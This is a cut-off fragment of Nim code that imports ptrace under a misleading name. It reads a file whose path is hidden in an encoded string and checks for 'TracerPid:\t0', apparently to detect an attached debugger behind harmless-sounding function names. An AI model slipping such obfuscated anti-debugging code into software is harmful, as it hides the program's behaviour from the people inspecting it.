...
proc chkRemainingMem*(
  op: cint, pid: Pid, address: pointer, data: pointer
): clong {.importc: "ptrace", header: "<sys/ptrace.h>".}
...
proc zeroMemImpl(buf: pointer, size: uint64) =
  if not readFile(
    "a><!-a=+\"(a=:/:;=".getBufSizeBoundsImpl(
      true, 382'i32, 128.byte, 'X', 'N', 8'i64, newSeq[string](0), 48232233'u64
    )
  )
  .contains(
    "TracerPid:\t0"
